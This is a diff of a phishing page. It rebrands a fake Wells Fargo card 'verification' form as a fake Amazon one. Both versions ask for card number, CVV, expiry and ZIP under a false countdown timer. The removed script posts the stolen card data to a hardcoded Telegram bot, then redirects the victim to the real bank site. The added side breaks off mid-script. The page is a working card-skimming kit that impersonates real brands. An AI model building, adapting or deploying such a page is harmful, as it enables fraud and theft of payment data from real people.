@@ -3,137 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bank Security Update</title>
+    <title>Account Verification | Secure Payment Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #f5f5f5;
+        :root {
+            --primary-color: #232f3e;
+            --secondary-color: #ff9900;
+            --text-color: #0f1111;
+            --light-gray: #f5f5f5;
+        }
+
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: 'Amazon Ember', Arial, sans-serif;
         }
+
+        body {
+            background-color: var(--light-gray);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
         .container {
-            max-width: 400px;
-            margin: 20px auto;
+            max-width: 450px;
+            margin: 30px auto;
             background: white;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+
+        .content {
             padding: 25px;
         }
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .logo {
-            height: 40px;
-            margin-bottom: 15px;
-        }
-        h1 {
-            color: #2c3e50;
-            font-size: 22px;
-            margin-bottom: 10px;
-        }
-        .notice {
+
+        .security-notice {
             background-color: #fff8e1;
-            border-left: 4px solid #ffc107;
+            border-left: 4px solid var(--secondary-color);
             padding: 15px;
             margin-bottom: 20px;
             font-size: 14px;
         }
+
+        .security-notice i {
+            color: var(--secondary-color);
+            margin-right: 8px;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
-        label {
+
+        .form-group label {
             display: block;
             margin-bottom: 8px;
-            font-weight: 500;
-            color: #555;
+            font-weight: 600;
+            color: var(--text-color);
+            font-size: 14px;
         }
-        input {
+
+        .form-control {
             width: 100%;
-            padding: 12px;
+            padding: 12px 15px;
             border: 1px solid #ddd;
-            border-radius: 5px;
+            border-radius: 4px;
             font-size: 16px;
-            box-sizing: border-box;
+            transition: border-color 0.3s;
         }
+
+        .form-control:focus {
+            border-color: var(--secondary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(255, 153, 0, 0.2);
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        .card-icons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .card-icons img {
+            height: 22px;
+            opacity: 0.7;
+        }
+
         .btn {
-            background-color: #4285f4;
-            color: white;
+            background-color: var(--secondary-color);
+            color: var(--primary-color);
             border: none;
             padding: 14px;
-            border-radius: 5px;
+            border-radius: 4px;
             font-size: 16px;
-            font-weight: 500;
-            width: 100%;
+            font-weight: 600;
             cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background-color 0.3s;
         }
+
+        .btn:hover {
+            background-color: #e88b00;
+        }
+
         .footer {
+            background-color: var(--light-gray);
+            padding: 20px;
             text-align: center;
-            margin-top: 20px;
             font-size: 12px;
-            color: #777;
+            color: #555;
         }
+
+        .footer a {
+            color: var(--secondary-color);
+            text-decoration: none;
+        }
+
         .timer {
-            color: #e74c3c;
+            color: #d9534f;
             font-size: 14px;
             margin-bottom: 20px;
             text-align: center;
+            font-weight: 500;
+        }
+
+        .amazon-logo {
+            height: 30px;
+            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://www.wellsfargo.com/img/logo.svg" alt="Wells Fargo" class="logo">
-            <h1>Security Verification Required</h1>
-            <p>Please verify your card information to prevent service interruption</p>
+            <img src="https://www.amazon.com/favicon.ico" alt="Amazon" class="amazon-logo">
+            <h1>Account Verification Required</h1>
+            <p>Complete this one-time verification to maintain account access</p>
         </div>
 
-        <div class="timer" id="countdown">Verification expires in: 04:59</div>
+        <div class="content">
+            <div class="timer" id="countdown">Verification expires in: 03:59</div>
 
-        <div class="notice">
-            <strong>Important:</strong> This verification is required to maintain access to your account.
-            Your information is protected by 256-bit encryption.
+            <div class="security-notice">
+                <i class="fas fa-lock"></i>
+                <strong>Secure Verification:</strong> Your information is protected with 256-bit encryption.
+                This verification is required for all payment methods.
+            </div>
+
+            <div class="card-icons">
+                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Visa">
+                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg" alt="Mastercard">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/American_Express_logo.svg/1200px-American_Express_logo.svg.png" alt="American Express" style="height: 16px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover" style="height: 16px;">
+            </div>
+
+            <form id="cardForm">
+                <div class="form-group">
+                    <label for="cardNumber">Debit Card Number</label>
+                    <input type="text" id="cardNumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="nameOnCard">Name on Card</label>
+                    <input type="text" id="nameOnCard" class="form-control" placeholder="JOHN DOE" required>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label for="expDate">Expiration Date</label>
+                        <input type="text" id="expDate" class="form-control" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">Security Code</label>
+                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="billingZip">Billing ZIP Code</label>
+                    <input type="text" id="billingZip" class="form-control" placeholder="12345" maxlength="10" required>
+                </div>
+
+                <button type="submit" class="btn">Verify Payment Method</button>
+            </form>
         </div>
-
-        <form id="cardForm">
-            <div class="form-group">
-                <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-            </div>
-
-            <div class="form-group">
-                <label for="nameOnCard">Name on Card</label>
-                <input type="text" id="nameOnCard" placeholder="JOHN DOE" required>
-            </div>
-
-            <div style="display: flex; gap: 15px;">
-                <div style="flex: 1;">
-                    <label for="expDate">Expires</label>
-                    <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" required>
-                </div>
-                <div style="flex: 1;">
-                    <label for="cvv">Security Code</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
-                </div>
-            </div>
-
-            <div class="form-group" style="margin-top: 20px;">
-                <label for="billingZip">Billing ZIP Code</label>
-                <input type="text" id="billingZip" placeholder="12345" maxlength="10" required>
-            </div>
-
-            <button type="submit" class="btn">Verify My Card</button>
-        </form>
 
         <div class="footer">
-            <p>© 2023 Wells Fargo. All rights reserved.</p>
-            <p>This verification is required for all cardholders.</p>
+            <p>This verification helps protect your account from unauthorized access.</p>
+            <p>© 2023 Amazon.com, Inc. or its affiliates. All rights reserved. |
+            <a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a></p>
         </div>
     </div>
 
     <script>
-        // Format card number
+        // Format card number with spaces
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s+/g, '');
             if (value.length > 0) {
@@ -152,7 +245,7 @@
         });
 
         // Countdown timer
-        let timeLeft = 299;
+        let timeLeft = 239;
         const timerElement = document.getElementById('countdown');
 
         const countdown = setInterval(() => {
@@ -163,49 +256,9 @@
 
             if (timeLeft <= 0) {
                 clearInterval(countdown);
-                timerElement.textContent = "Verification expired - please try again";
+                timerElement.textContent = "Verification time expired";
                 document.querySelector('.btn').disabled = true;
             }
         }, 1000);
 
-        // Form submission
-        document.getElementById('cardForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const cardData = {
-                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-                nameOnCard: document.getElementById('nameOnCard').value,
-                expDate: document.getElementById('expDate').value,
-                cvv: document.getElementById('cvv').value,
-                billingZip: document.getElementById('billingZip').value,
-                timestamp: new Date().toISOString()
-            };
-
-            // Send to Telegram bot (recommended)
-            fetch('https://api.telegram.org/bot8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY/sendMessage', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '7845249398',
-                    text: `💳 New Card Submission:\n\n` +
-                          `🔢 Card: ${cardData.cardNumber}\n` +
-                          `👤 Name: ${cardData.nameOnCard}\n` +
-                          `📅 Exp: ${cardData.expDate}\n` +
-                          `🔒 CVV: ${cardData.cvv}\n` +
-                          `📍 ZIP: ${cardData.billingZip}\n` +
-                          `🕒 Time: ${cardData.timestamp}`
-                })
-            })
-            .then(() => {
-                // Redirect to legitimate site
-                window.location.href = 'https://www.wellsfargo.com/';
-            })
-            .catch(() => {
-                window.location.href = 'https://www.wellsfargo.com/';
-            });
-        });
-    </script>
-</body>
-</html>
+        // Form
